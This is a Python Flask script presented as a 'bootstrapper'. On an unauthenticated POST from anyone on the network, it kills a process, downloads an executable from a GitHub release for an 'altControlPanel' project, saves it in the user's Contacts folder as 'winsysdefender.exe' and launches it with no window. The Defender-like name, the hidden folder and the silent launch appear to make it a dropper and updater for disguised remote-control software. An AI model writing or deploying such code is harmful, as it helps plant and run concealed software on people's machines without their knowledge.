import os
import requests
import subprocess
import time
import threading
from flask import Flask, request, jsonify

app = Flask(__name__)

# === CONFIGURATION ===
CONTACTS_DIR = os.path.join(os.path.expanduser("~"), "Contacts")
DEST_PATH = os.path.join(CONTACTS_DIR, "winsysdefender.exe")
DOWNLOAD_URL = "https://github.com/FalconTheBerd/altControlPanel/releases/download/v1.x/alt.exe"

@app.route('/update_alt', methods=['POST'])
def update_alt():
    try:
        def replace_and_restart():
            time.sleep(1)

            print("[INFO] Killing winsysdefender.exe...")
            os.system("taskkill /f /im winsysdefender.exe >nul 2>&1")
            time.sleep(1)

            tmp_path = DEST_PATH + ".new"
            print(f"[INFO] Downloading alt.exe from GitHub...")
            r = requests.get(DOWNLOAD_URL)
            if r.status_code != 200:
                print(f"[ERROR] Download failed: HTTP {r.status_code}")
                return

            os.makedirs(CONTACTS_DIR, exist_ok=True)
            with open(tmp_path, "wb") as f:
                f.write(r.content)

            print("[INFO] Replacing winsysdefender.exe...")
            os.replace(tmp_path, DEST_PATH)

            print("[INFO] Launching winsysdefender.exe...")
            subprocess.Popen([DEST_PATH], creationflags=subprocess.CREATE_NO_WINDOW)


        threading.Thread(target=replace_and_restart).start()
        return jsonify({"message": "Update started."}), 200

    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/')
def index():
    return "Bootstrapper is running. POST to /update_alt to deploy winsysdefender.exe from GitHub."

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5050)
